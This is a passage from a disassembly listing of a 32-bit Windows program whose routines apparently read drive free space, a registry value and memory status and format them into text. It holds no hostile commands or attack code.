  402bfc:	8d 8d e4 fb ff ff    	lea    -0x41c(%ebp),%ecx
  402c02:	51                   	push   %ecx
  402c03:	8d 95 f0 fb ff ff    	lea    -0x410(%ebp),%edx
  402c09:	52                   	push   %edx
  402c0a:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  402c10:	50                   	push   %eax
  402c11:	8b 07                	mov    (%edi),%eax
  402c13:	8b ca                	mov    %edx,%ecx
  402c15:	51                   	push   %ecx
  402c16:	8d 95 fc fd ff ff    	lea    -0x204(%ebp),%edx
  402c1c:	52                   	push   %edx
  402c1d:	50                   	push   %eax
  402c1e:	6a 00                	push   $0x0
  402c20:	ff 15 14 50 42 00    	call   *0x425014
  402c26:	85 c0                	test   %eax,%eax
  402c28:	75 3a                	jne    0x402c64
  402c2a:	ff 15 64 50 42 00    	call   *0x425064
  402c30:	3d 34 05 00 00       	cmp    $0x534,%eax
  402c35:	75 1b                	jne    0x402c52
  402c37:	68 c0 8f 42 00       	push   $0x428fc0
  402c3c:	8d 8d fc fd ff ff    	lea    -0x204(%ebp),%ecx
  402c42:	68 00 01 00 00       	push   $0x100
  402c47:	51                   	push   %ecx
  402c48:	e8 2d 00 01 00       	call   0x412c7a
  402c4d:	83 c4 0c             	add    $0xc,%esp
  402c50:	eb 40                	jmp    0x402c92
  402c52:	5f                   	pop    %edi
  402c53:	33 c0                	xor    %eax,%eax
  402c55:	5b                   	pop    %ebx
  402c56:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402c59:	33 cd                	xor    %ebp,%ecx
  402c5b:	e8 3f f7 00 00       	call   0x41239f
  402c60:	8b e5                	mov    %ebp,%esp
  402c62:	5d                   	pop    %ebp
  402c63:	c3                   	ret
  402c64:	8b 95 ec fb ff ff    	mov    -0x414(%ebp),%edx
  402c6a:	52                   	push   %edx
  402c6b:	8d 9d fc fd ff ff    	lea    -0x204(%ebp),%ebx
  402c71:	e8 ba e6 ff ff       	call   0x401330
  402c76:	8b 85 e8 fb ff ff    	mov    -0x418(%ebp),%eax
  402c7c:	50                   	push   %eax
  402c7d:	8d 9d fc fb ff ff    	lea    -0x404(%ebp),%ebx
  402c83:	e8 a8 e6 ff ff       	call   0x401330
  402c88:	c7 85 f4 fb ff ff 01 	movl   $0x1,-0x40c(%ebp)
  402c8f:	00 00 00 
  402c92:	85 ff                	test   %edi,%edi
  402c94:	74 10                	je     0x402ca6
  402c96:	57                   	push   %edi
  402c97:	6a 00                	push   $0x0
  402c99:	ff 15 6c 50 42 00    	call   *0x42506c
  402c9f:	50                   	push   %eax
  402ca0:	ff 15 70 50 42 00    	call   *0x425070
  402ca6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402ca9:	8b 85 f4 fb ff ff    	mov    -0x40c(%ebp),%eax
  402caf:	5f                   	pop    %edi
  402cb0:	33 cd                	xor    %ebp,%ecx
  402cb2:	5b                   	pop    %ebx
  402cb3:	e8 e7 f6 00 00       	call   0x41239f
  402cb8:	8b e5                	mov    %ebp,%esp
  402cba:	5d                   	pop    %ebp
  402cbb:	c3                   	ret
  402cbc:	cc                   	int3
  402cbd:	cc                   	int3
  402cbe:	cc                   	int3
  402cbf:	cc                   	int3
  402cc0:	55                   	push   %ebp
  402cc1:	8b ec                	mov    %esp,%ebp
  402cc3:	6a ff                	push   $0xffffffff
  402cc5:	68 8b 3e 42 00       	push   $0x423e8b
  402cca:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402cd0:	50                   	push   %eax
  402cd1:	83 ec 14             	sub    $0x14,%esp
  402cd4:	53                   	push   %ebx
  402cd5:	56                   	push   %esi
  402cd6:	57                   	push   %edi
  402cd7:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  402cdc:	33 c5                	xor    %ebp,%eax
  402cde:	50                   	push   %eax
  402cdf:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402ce2:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402ce8:	ff 15 64 51 42 00    	call   *0x425164
  402cee:	50                   	push   %eax
  402cef:	33 db                	xor    %ebx,%ebx
  402cf1:	53                   	push   %ebx
  402cf2:	68 00 04 00 00       	push   $0x400
  402cf7:	ff 15 74 50 42 00    	call   *0x425074
  402cfd:	8b f0                	mov    %eax,%esi
  402cff:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  402d02:	3b f3                	cmp    %ebx,%esi
  402d04:	74 1b                	je     0x402d21
  402d06:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402d09:	50                   	push   %eax
  402d0a:	6a 08                	push   $0x8
  402d0c:	56                   	push   %esi
  402d0d:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  402d10:	ff 15 1c 50 42 00    	call   *0x42501c
  402d16:	85 c0                	test   %eax,%eax
  402d18:	75 1e                	jne    0x402d38
  402d1a:	56                   	push   %esi
  402d1b:	ff 15 58 50 42 00    	call   *0x425058
  402d21:	b8 05 40 00 80       	mov    $0x80004005,%eax
  402d26:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402d29:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402d30:	59                   	pop    %ecx
  402d31:	5f                   	pop    %edi
  402d32:	5e                   	pop    %esi
  402d33:	5b                   	pop    %ebx
  402d34:	8b e5                	mov    %ebp,%esp
  402d36:	5d                   	pop    %ebp
  402d37:	c3                   	ret
  402d38:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  402d3b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402d3e:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  402d41:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402d44:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  402d48:	8b 75 ec             	mov    -0x14(%ebp),%esi
  402d4b:	51                   	push   %ecx
  402d4c:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402d4f:	e8 ec fd ff ff       	call   0x402b40
  402d54:	8b 7d f0             	mov    -0x10(%ebp),%edi
  402d57:	83 c4 04             	add    $0x4,%esp
  402d5a:	8b f0                	mov    %eax,%esi
  402d5c:	3b fb                	cmp    %ebx,%edi
  402d5e:	74 25                	je     0x402d85
  402d60:	8b 07                	mov    (%edi),%eax
  402d62:	3b c3                	cmp    %ebx,%eax
  402d64:	74 1f                	je     0x402d85
  402d66:	8b 1d 44 52 42 00    	mov    0x425244,%ebx
  402d6c:	50                   	push   %eax
  402d6d:	ff d3                	call   *%ebx
  402d6f:	83 f8 32             	cmp    $0x32,%eax
  402d72:	76 11                	jbe    0x402d85
  402d74:	8b 07                	mov    (%edi),%eax
  402d76:	85 c0                	test   %eax,%eax
  402d78:	74 07                	je     0x402d81
  402d7a:	50                   	push   %eax
  402d7b:	ff d3                	call   *%ebx
  402d7d:	8b d8                	mov    %eax,%ebx
  402d7f:	eb 09                	jmp    0x402d8a
  402d81:	33 db                	xor    %ebx,%ebx
  402d83:	eb 05                	jmp    0x402d8a
  402d85:	bb 64 00 00 00       	mov    $0x64,%ebx
  402d8a:	85 ff                	test   %edi,%edi
  402d8c:	75 35                	jne    0x402dc3
  402d8e:	6a 0c                	push   $0xc
  402d90:	e8 92 fb 00 00       	call   0x412927
  402d95:	83 c4 04             	add    $0x4,%esp
  402d98:	85 c0                	test   %eax,%eax
  402d9a:	74 0e                	je     0x402daa
  402d9c:	89 78 04             	mov    %edi,0x4(%eax)
  402d9f:	c7 40 08 01 00 00 00 	movl   $0x1,0x8(%eax)
  402da6:	89 38                	mov    %edi,(%eax)
  402da8:	eb 02                	jmp    0x402dac
  402daa:	33 c0                	xor    %eax,%eax
  402dac:	8b f8                	mov    %eax,%edi
  402dae:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  402db2:	89 7d f0             	mov    %edi,-0x10(%ebp)
  402db5:	85 c0                	test   %eax,%eax
  402db7:	75 0a                	jne    0x402dc3
  402db9:	68 0e 00 07 80       	push   $0x8007000e
  402dbe:	e8 fd ff 01 00       	call   0x422dc0
  402dc3:	8b 17                	mov    (%edi),%edx
  402dc5:	8b 45 08             	mov    0x8(%ebp),%eax
  402dc8:	53                   	push   %ebx
  402dc9:	52                   	push   %edx
  402dca:	50                   	push   %eax
  402dcb:	e8 60 17 01 00       	call   0x414530
  402dd0:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402dd3:	8b 1d 58 50 42 00    	mov    0x425058,%ebx
  402dd9:	83 c4 0c             	add    $0xc,%esp
  402ddc:	51                   	push   %ecx
  402ddd:	ff d3                	call   *%ebx
  402ddf:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402de2:	52                   	push   %edx
  402de3:	ff d3                	call   *%ebx
  402de5:	f7 de                	neg    %esi
  402de7:	1b f6                	sbb    %esi,%esi
  402de9:	81 e6 fb bf ff 7f    	and    $0x7fffbffb,%esi
  402def:	81 c6 05 40 00 80    	add    $0x80004005,%esi
  402df5:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  402df9:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  402dfc:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  402dff:	8b 35 70 51 42 00    	mov    0x425170,%esi
  402e05:	85 db                	test   %ebx,%ebx
  402e07:	74 30                	je     0x402e39
  402e09:	8d 43 08             	lea    0x8(%ebx),%eax
  402e0c:	50                   	push   %eax
  402e0d:	ff d6                	call   *%esi
  402e0f:	85 c0                	test   %eax,%eax
  402e11:	75 26                	jne    0x402e39
  402e13:	8b 03                	mov    (%ebx),%eax
  402e15:	85 c0                	test   %eax,%eax
  402e17:	74 07                	je     0x402e20
  402e19:	50                   	push   %eax
  402e1a:	ff 15 48 52 42 00    	call   *0x425248
  402e20:	8b 43 04             	mov    0x4(%ebx),%eax
  402e23:	85 c0                	test   %eax,%eax
  402e25:	74 09                	je     0x402e30
  402e27:	50                   	push   %eax
  402e28:	e8 a0 f6 00 00       	call   0x4124cd
  402e2d:	83 c4 04             	add    $0x4,%esp
  402e30:	53                   	push   %ebx
  402e31:	e8 97 f6 00 00       	call   0x4124cd
  402e36:	83 c4 04             	add    $0x4,%esp
  402e39:	8d 4f 08             	lea    0x8(%edi),%ecx
  402e3c:	51                   	push   %ecx
  402e3d:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402e44:	ff d6                	call   *%esi
  402e46:	85 c0                	test   %eax,%eax
  402e48:	75 26                	jne    0x402e70
  402e4a:	8b 07                	mov    (%edi),%eax
  402e4c:	85 c0                	test   %eax,%eax
  402e4e:	74 07                	je     0x402e57
  402e50:	50                   	push   %eax
  402e51:	ff 15 48 52 42 00    	call   *0x425248
  402e57:	8b 47 04             	mov    0x4(%edi),%eax
  402e5a:	85 c0                	test   %eax,%eax
  402e5c:	74 09                	je     0x402e67
  402e5e:	50                   	push   %eax
  402e5f:	e8 69 f6 00 00       	call   0x4124cd
  402e64:	83 c4 04             	add    $0x4,%esp
  402e67:	57                   	push   %edi
  402e68:	e8 60 f6 00 00       	call   0x4124cd
  402e6d:	83 c4 04             	add    $0x4,%esp
  402e70:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402e73:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402e76:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402e7d:	59                   	pop    %ecx
  402e7e:	5f                   	pop    %edi
  402e7f:	5e                   	pop    %esi
  402e80:	5b                   	pop    %ebx
  402e81:	8b e5                	mov    %ebp,%esp
  402e83:	5d                   	pop    %ebp
  402e84:	c3                   	ret
  402e85:	cc                   	int3
  402e86:	cc                   	int3
  402e87:	cc                   	int3
  402e88:	cc                   	int3
  402e89:	cc                   	int3
  402e8a:	cc                   	int3
  402e8b:	cc                   	int3
  402e8c:	cc                   	int3
  402e8d:	cc                   	int3
  402e8e:	cc                   	int3
  402e8f:	cc                   	int3
  402e90:	55                   	push   %ebp
  402e91:	8b ec                	mov    %esp,%ebp
  402e93:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402e99:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  402e9e:	33 c5                	xor    %ebp,%eax
  402ea0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402ea3:	56                   	push   %esi
  402ea4:	33 f6                	xor    %esi,%esi
  402ea6:	57                   	push   %edi
  402ea7:	89 75 a4             	mov    %esi,-0x5c(%ebp)
  402eaa:	89 75 a0             	mov    %esi,-0x60(%ebp)
  402ead:	33 ff                	xor    %edi,%edi
  402eaf:	90                   	nop
  402eb0:	8d 46 42             	lea    0x42(%esi),%eax
  402eb3:	66 89 45 e8          	mov    %ax,-0x18(%ebp)
  402eb7:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402eba:	33 c0                	xor    %eax,%eax
  402ebc:	51                   	push   %ecx
  402ebd:	c7 45 ea 3a 00 5c 00 	movl   $0x5c003a,-0x16(%ebp)
  402ec4:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
  402ec8:	ff 15 78 50 42 00    	call   *0x425078
  402ece:	83 f8 03             	cmp    $0x3,%eax
  402ed1:	75 37                	jne    0x402f0a
  402ed3:	8d 55 88             	lea    -0x78(%ebp),%edx
  402ed6:	52                   	push   %edx
  402ed7:	8d 45 90             	lea    -0x70(%ebp),%eax
  402eda:	50                   	push   %eax
  402edb:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  402ede:	51                   	push   %ecx
  402edf:	8d 55 e8             	lea    -0x18(%ebp),%edx
  402ee2:	52                   	push   %edx
  402ee3:	47                   	inc    %edi
  402ee4:	ff 15 7c 50 42 00    	call   *0x42507c
  402eea:	8b 45 90             	mov    -0x70(%ebp),%eax
  402eed:	8b 4d 94             	mov    -0x6c(%ebp),%ecx
  402ef0:	8b 55 88             	mov    -0x78(%ebp),%edx
  402ef3:	0f ac c8 1e          	shrd   $0x1e,%ecx,%eax
  402ef7:	01 45 a4             	add    %eax,-0x5c(%ebp)
  402efa:	8b 45 8c             	mov    -0x74(%ebp),%eax
  402efd:	0f ac c2 1e          	shrd   $0x1e,%eax,%edx
  402f01:	c1 e9 1e             	shr    $0x1e,%ecx
  402f04:	c1 e8 1e             	shr    $0x1e,%eax
  402f07:	01 55 a0             	add    %edx,-0x60(%ebp)
  402f0a:	46                   	inc    %esi
  402f0b:	83 fe 1a             	cmp    $0x1a,%esi
  402f0e:	7c a0                	jl     0x402eb0
  402f10:	6a 40                	push   $0x40
  402f12:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  402f15:	6a 00                	push   $0x0
  402f17:	51                   	push   %ecx
  402f18:	89 7d 9c             	mov    %edi,-0x64(%ebp)
  402f1b:	e8 10 13 01 00       	call   0x414230
  402f20:	83 c4 0c             	add    $0xc,%esp
  402f23:	8d 55 a8             	lea    -0x58(%ebp),%edx
  402f26:	52                   	push   %edx
  402f27:	c7 45 a8 40 00 00 00 	movl   $0x40,-0x58(%ebp)
  402f2e:	ff 15 80 50 42 00    	call   *0x425080
  402f34:	8b 75 b8             	mov    -0x48(%ebp),%esi
  402f37:	8b 7d bc             	mov    -0x44(%ebp),%edi
  402f3a:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402f3d:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  402f40:	8b 55 a0             	mov    -0x60(%ebp),%edx
  402f43:	0f ac fe 1e          	shrd   $0x1e,%edi,%esi
  402f47:	c1 ef 1e             	shr    $0x1e,%edi
  402f4a:	83 c6 01             	add    $0x1,%esi
  402f4d:	83 d7 00             	adc    $0x0,%edi
  402f50:	0f ac c8 1e          	shrd   $0x1e,%ecx,%eax
  402f54:	c1 e9 1e             	shr    $0x1e,%ecx
  402f57:	83 c0 01             	add    $0x1,%eax
  402f5a:	83 d1 00             	adc    $0x0,%ecx
  402f5d:	51                   	push   %ecx
  402f5e:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  402f61:	50                   	push   %eax
  402f62:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  402f65:	52                   	push   %edx
  402f66:	50                   	push   %eax
  402f67:	51                   	push   %ecx
  402f68:	68 d8 8f 42 00       	push   $0x428fd8
  402f6d:	68 c8 00 00 00       	push   $0xc8
  402f72:	53                   	push   %ebx
  402f73:	e8 2f fa 00 00       	call   0x4129a7
  402f78:	57                   	push   %edi
  402f79:	56                   	push   %esi
  402f7a:	53                   	push   %ebx
  402f7b:	68 28 90 42 00       	push   $0x429028
  402f80:	68 c8 00 00 00       	push   $0xc8
  402f85:	53                   	push   %ebx
  402f86:	e8 1c fa 00 00       	call   0x4129a7
  402f8b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402f8e:	83 c4 38             	add    $0x38,%esp
  402f91:	5f                   	pop    %edi
  402f92:	33 cd                	xor    %ebp,%ecx
  402f94:	5e                   	pop    %esi
  402f95:	e8 05 f4 00 00       	call   0x41239f
  402f9a:	8b e5                	mov    %ebp,%esp
  402f9c:	5d                   	pop    %ebp
  402f9d:	c3                   	ret
  402f9e:	cc                   	int3
  402f9f:	cc                   	int3
  402fa0:	55                   	push   %ebp
  402fa1:	8b ec                	mov    %esp,%ebp
  402fa3:	6a fe                	push   $0xfffffffe
  402fa5:	68 80 b3 42 00       	push   $0x42b380
  402faa:	68 30 64 41 00       	push   $0x416430
  402faf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402fb5:	50                   	push   %eax
  402fb6:	81 ec 4c 02 00 00    	sub    $0x24c,%esp
  402fbc:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  402fc1:	31 45 f8             	xor    %eax,-0x8(%ebp)
  402fc4:	33 c5                	xor    %ebp,%eax
  402fc6:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402fc9:	53                   	push   %ebx
  402fca:	56                   	push   %esi
  402fcb:	57                   	push   %edi
  402fcc:	50                   	push   %eax
  402fcd:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402fd0:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402fd6:	8b 45 08             	mov    0x8(%ebp),%eax
  402fd9:	89 85 c8 fd ff ff    	mov    %eax,-0x238(%ebp)
  402fdf:	8b f1                	mov    %ecx,%esi
  402fe1:	8b fa                	mov    %edx,%edi
  402fe3:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  402fe6:	c7 85 d4 fd ff ff 01 	movl   $0x1,-0x22c(%ebp)
  402fed:	00 00 00 
  402ff0:	c7 85 d8 fd ff ff 00 	movl   $0x0,-0x228(%ebp)
  402ff7:	00 00 00 
  402ffa:	68 08 02 00 00       	push   $0x208
  402fff:	6a 00                	push   $0x0
  403001:	8d 8d dc fd ff ff    	lea    -0x224(%ebp),%ecx
  403007:	51                   	push   %ecx
  403008:	e8 23 12 01 00       	call   0x414230
  40300d:	83 c4 0c             	add    $0xc,%esp
  403010:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403017:	8d 95 cc fd ff ff    	lea    -0x234(%ebp),%edx
  40301d:	52                   	push   %edx
  40301e:	68 19 00 02 00       	push   $0x20019
  403023:	6a 00                	push   $0x0
  403025:	56                   	push   %esi
  403026:	8b 85 c8 fd ff ff    	mov    -0x238(%ebp),%eax
  40302c:	50                   	push   %eax
  40302d:	ff 15 10 50 42 00    	call   *0x425010
  403033:	85 c0                	test   %eax,%eax
  403035:	74 0f                	je     0x403046
  403037:	c7 85 d8 fd ff ff ff 	movl   $0xffffffff,-0x228(%ebp)
  40303e:	ff ff ff 
  403041:	e9 b0 01 00 00       	jmp    0x4031f6
  403046:	8b 45 10             	mov    0x10(%ebp),%eax
  403049:	83 e8 00             	sub    $0x0,%eax
  40304c:	0f 84 08 01 00 00    	je     0x40315a
  403052:	be 01 00 00 00       	mov    $0x1,%esi
  403057:	2b c6                	sub    %esi,%eax
  403059:	0f 84 94 00 00 00    	je     0x4030f3
  40305f:	2b c6                	sub    %esi,%eax
  403061:	0f 85 8f 01 00 00    	jne    0x4031f6
  403067:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  40306d:	85 c0                	test   %eax,%eax
  40306f:	0f 84 81 01 00 00    	je     0x4031f6
  403075:	83 f8 02             	cmp    $0x2,%eax
  403078:	0f 87 78 01 00 00    	ja     0x4031f6
  40307e:	c7 85 d0 fd ff ff 08 	movl   $0x208,-0x230(%ebp)
  403085:	02 00 00 
  403088:	8d 8d d0 fd ff ff    	lea    -0x230(%ebp),%ecx
  40308e:	51                   	push   %ecx
  40308f:	8d 95 dc fd ff ff    	lea    -0x224(%ebp),%edx
  403095:	52                   	push   %edx
  403096:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  40309c:	50                   	push   %eax
  40309d:	6a 00                	push   $0x0
  40309f:	57                   	push   %edi
  4030a0:	8b 8d cc fd ff ff    	mov    -0x234(%ebp),%ecx
  4030a6:	51                   	push   %ecx
  4030a7:	ff 15 0c 50 42 00    	call   *0x42500c
  4030ad:	85 c0                	test   %eax,%eax
  4030af:	75 33                	jne    0x4030e4
  4030b1:	68 f0 8e 42 00       	push   $0x428ef0
  4030b6:	8d 95 dc fd ff ff    	lea    -0x224(%ebp),%edx
  4030bc:	52                   	push   %edx
  4030bd:	ff 15 48 51 42 00    	call   *0x425148
  4030c3:	85 c0                	test   %eax,%eax
  4030c5:	0f 84 6c ff ff ff    	je     0x403037
  4030cb:	8d 85 dc fd ff ff    	lea    -0x224(%ebp),%eax
  4030d1:	50                   	push   %eax
  4030d2:	53                   	push   %ebx
  4030d3:	ff 15 60 50 42 00    	call   *0x425060
  4030d9:	89 b5 d8 fd ff ff    	mov    %esi,-0x228(%ebp)
  4030df:	e9 12 01 00 00       	jmp    0x4031f6
  4030e4:	c7 85 d8 fd ff ff 00 	movl   $0x0,-0x228(%ebp)
  4030eb:	00 00 00 
  4030ee:	e9 03 01 00 00       	jmp    0x4031f6
  4030f3:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  4030f9:	85 c0                	test   %eax,%eax
  4030fb:	0f 84 f5 00 00 00    	je     0x4031f6
  403101:	83 f8 02             	cmp    $0x2,%eax
  403104:	0f 87 ec 00 00 00    	ja     0x4031f6
  40310a:	c7 85 d0 fd ff ff 08 	movl   $0x208,-0x230(%ebp)
  403111:	02 00 00 
  403114:	8d 8d d0 fd ff ff    	lea    -0x230(%ebp),%ecx
  40311a:	51                   	push   %ecx
  40311b:	8d 95 dc fd ff ff    	lea    -0x224(%ebp),%edx
  403121:	52                   	push   %edx
  403122:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  403128:	50                   	push   %eax
  403129:	6a 00                	push   $0x0
  40312b:	57                   	push   %edi
  40312c:	8b 8d cc fd ff ff    	mov    -0x234(%ebp),%ecx
  403132:	51                   	push   %ecx
  403133:	ff 15 0c 50 42 00    	call   *0x42500c
  403139:	85 c0                	test   %eax,%eax
  40313b:	0f 85 a9 00 00 00    	jne    0x4031ea
  403141:	8d 95 dc fd ff ff    	lea    -0x224(%ebp),%edx
  403147:	52                   	push   %edx
  403148:	53                   	push   %ebx
  403149:	ff 15 60 50 42 00    	call   *0x425060
  40314f:	89 b5 d8 fd ff ff    	mov    %esi,-0x228(%ebp)
  403155:	e9 9c 00 00 00       	jmp    0x4031f6
  40315a:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  403160:	85 c0                	test   %eax,%eax
  403162:	0f 84 8e 00 00 00    	je     0x4031f6
  403168:	83 f8 02             	cmp    $0x2,%eax
  40316b:	0f 87 85 00 00 00    	ja     0x4031f6
  403171:	c7 85 d0 fd ff ff 08 	movl   $0x208,-0x230(%ebp)
  403178:	02 00 00 
  40317b:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  403181:	50                   	push   %eax
  403182:	8d 8d dc fd ff ff    	lea    -0x224(%ebp),%ecx
  403188:	51                   	push   %ecx
  403189:	8d 95 d4 fd ff ff    	lea    -0x22c(%ebp),%edx
  40318f:	52                   	push   %edx
  403190:	6a 00                	push   $0x0
  403192:	57                   	push   %edi
  403193:	8b 85 cc fd ff ff    	mov    -0x234(%ebp),%eax
  403199:	50                   	push   %eax
  40319a:	ff 15 0c 50 42 00    	call   *0x42500c
  4031a0:	85 c0                	test   %eax,%eax
  4031a2:	75 46                	jne    0x4031ea
  4031a4:	8d 8d a4 fd ff ff    	lea    -0x25c(%ebp),%ecx
  4031aa:	51                   	push   %ecx
  4031ab:	ff 15 84 50 42 00    	call   *0x425084
  4031b1:	8b 95 b8 fd ff ff    	mov    -0x248(%ebp),%edx
  4031b7:	52                   	push   %edx
  4031b8:	8d 85 dc fd ff ff    	lea    -0x224(%ebp),%eax
  4031be:	50                   	push   %eax
  4031bf:	68 40 90 42 00       	push   $0x429040
  4031c4:	8b c8                	mov    %eax,%ecx
  4031c6:	51                   	push   %ecx
  4031c7:	ff 15 bc 52 42 00    	call   *0x4252bc
  4031cd:	83 c4 10             	add    $0x10,%esp
  4031d0:	8d 95 dc fd ff ff    	lea    -0x224(%ebp),%edx
  4031d6:	52                   	push   %edx
  4031d7:	53                   	push   %ebx
  4031d8:	ff 15 60 50 42 00    	call   *0x425060
  4031de:	c7 85 d8 fd ff ff 01 	movl   $0x1,-0x228(%ebp)
  4031e5:	00 00 00 
  4031e8:	eb 0c                	jmp    0x4031f6
  4031ea:	68 50 90 42 00       	push   $0x429050
  4031ef:	53                   	push   %ebx
  4031f0:	ff 15 60 50 42 00    	call   *0x425060
  4031f6:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4031fd:	e8 22 00 00 00       	call   0x403224
  403202:	8b 85 d8 fd ff ff    	mov    -0x228(%ebp),%eax
  403208:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40320b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403212:	59                   	pop    %ecx
  403213:	5f                   	pop    %edi
  403214:	5e                   	pop    %esi
  403215:	5b                   	pop    %ebx
  403216:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403219:	33 cd                	xor    %ebp,%ecx
  40321b:	e8 7f f1 00 00       	call   0x41239f
  403220:	8b e5                	mov    %ebp,%esp
  403222:	5d                   	pop    %ebp
  403223:	c3                   	ret
  403224:	8b 85 c8 fd ff ff    	mov    -0x238(%ebp),%eax
  40322a:	50                   	push   %eax
  40322b:	8b 35 2c 50 42 00    	mov    0x42502c,%esi
  403231:	ff d6                	call   *%esi
  403233:	8b 8d cc fd ff ff    	mov    -0x234(%ebp),%ecx
  403239:	51                   	push   %ecx
  40323a:	ff d6                	call   *%esi
  40323c:	c3                   	ret
  40323d:	cc                   	int3
  40323e:	cc                   	int3
  40323f:	cc                   	int3
  403240:	55                   	push   %ebp
  403241:	8b ec                	mov    %esp,%ebp
  403243:	81 ec 4c 02 00 00    	sub    $0x24c,%esp
  403249:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  40324e:	33 c5                	xor    %ebp,%eax
  403250:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403253:	8d 85 34 ff ff ff    	lea    -0xcc(%ebp),%eax
  403259:	50                   	push   %eax
  40325a:	ff 15 6c 51 42 00    	call   *0x42516c
  403260:	6a 01                	push   $0x1
  403262:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  403268:	51                   	push   %ecx
  403269:	68 02 00 00 80       	push   $0x80000002
  40326e:	ba 5c 90 42 00       	mov    $0x42905c,%edx
  403273:	b9 78 90 42 00       	mov    $0x429078,%ecx
  403278:	e8 23 fd ff ff       	call   0x402fa0
  40327d:	83 c4 0c             	add    $0xc,%esp
  403280:	6a 00                	push   $0x0
  403282:	ff 15 54 53 42 00    	call   *0x425354
  403288:	8d 95 b4 fd ff ff    	lea    -0x24c(%ebp),%edx
  40328e:	52                   	push   %edx
  40328f:	68 b8 81 42 00       	push   $0x4281b8
  403294:	6a 17                	push   $0x17
  403296:	6a 00                	push   $0x0
  403298:	68 a8 81 42 00       	push   $0x4281a8
  40329d:	ff 15 58 53 42 00    	call   *0x425358
  4032a3:	85 c0                	test   %eax,%eax
  4032a5:	78 10                	js     0x4032b7
  4032a7:	8b 85 b4 fd ff ff    	mov    -0x24c(%ebp),%eax
  4032ad:	8b 08                	mov    (%eax),%ecx
  4032af:	8b 51 48             	mov    0x48(%ecx),%edx
  4032b2:	6a 00                	push   $0x0
  4032b4:	50                   	push   %eax
  4032b5:	ff d2                	call   *%edx
  4032b7:	8b 85 b4 fd ff ff    	mov    -0x24c(%ebp),%eax
  4032bd:	6a 00                	push   $0x0
  4032bf:	8d 95 b8 fd ff ff    	lea    -0x248(%ebp),%edx
  4032c5:	c7 85 b8 fd ff ff 7c 	movl   $0x17c,-0x248(%ebp)
  4032cc:	01 00 00 
  4032cf:	8b 08                	mov    (%eax),%ecx
  4032d1:	52                   	push   %edx
  4032d2:	50                   	push   %eax
  4032d3:	8b 41 2c             	mov    0x2c(%ecx),%eax
  4032d6:	ff d0                	call   *%eax
  4032d8:	8b 85 b4 fd ff ff    	mov    -0x24c(%ebp),%eax
  4032de:	8b 08                	mov    (%eax),%ecx
  4032e0:	8b 51 08             	mov    0x8(%ecx),%edx
  4032e3:	50                   	push   %eax
  4032e4:	ff d2                	call   *%edx
  4032e6:	8b 8d f8 fd ff ff    	mov    -0x208(%ebp),%ecx
  4032ec:	b8 05 41 10 04       	mov    $0x4104105,%eax
  4032f1:	f7 e1                	mul    %ecx
  4032f3:	2b ca                	sub    %edx,%ecx
  4032f5:	d1 e9                	shr    $1,%ecx
  4032f7:	03 ca                	add    %edx,%ecx
  4032f9:	c1 e9 09             	shr    $0x9,%ecx
  4032fc:	b8 05 41 10 04       	mov    $0x4104105,%eax
  403301:	f7 e1                	mul    %ecx
  403303:	2b ca                	sub    %edx,%ecx
  403305:	d1 e9                	shr    $1,%ecx
